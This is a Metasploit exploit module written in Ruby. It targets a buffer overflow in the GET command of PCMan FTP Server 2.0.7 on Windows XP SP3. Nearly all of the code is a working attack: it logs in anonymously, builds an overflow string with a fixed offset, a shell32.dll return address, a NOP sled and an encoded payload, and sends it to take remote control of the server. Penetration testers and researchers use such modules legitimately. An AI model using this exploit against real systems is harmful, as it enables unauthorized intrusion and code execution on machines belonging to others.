##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PCMAN FTP Server Buffer Overflow - GET Command',
      'Description'    => %q{
          This module exploits a buffer overflow vulnerability found in the GET command of the
          PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
          credientials are enabled.
      },
      'Author'         =>
          [
            'Koby',      # Initial Discovery -- https://www.exploit-db.com/exploits/38003/
            'Ye Yint Min Thu Htut'   # msf Module -- @yeyint_mth @yehg
          ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB',   ''],
          [ 'OSVDB',   '']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'Space'   => 1000,
          'BadChars'  => "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP3 English',
            {
              'Ret' => 0x7c9d30eb, # shell32.dll
              'Offset' => 2007
            }
          ],
        ],
      'DisclosureDate' => 'Aug 28 2015',
      'DefaultTarget'  => 0))
  end

  def check
    connect_login
    disconnect

    if /220 PCMan's FTP Server 2\.0/ === banner
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end


  def exploit
    connect_login

    print_status('Creating payload...')
    sploit = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(15)
    sploit << payload.encoded

    send_cmd( ["GET ", sploit], false )
    disconnect
  end

end
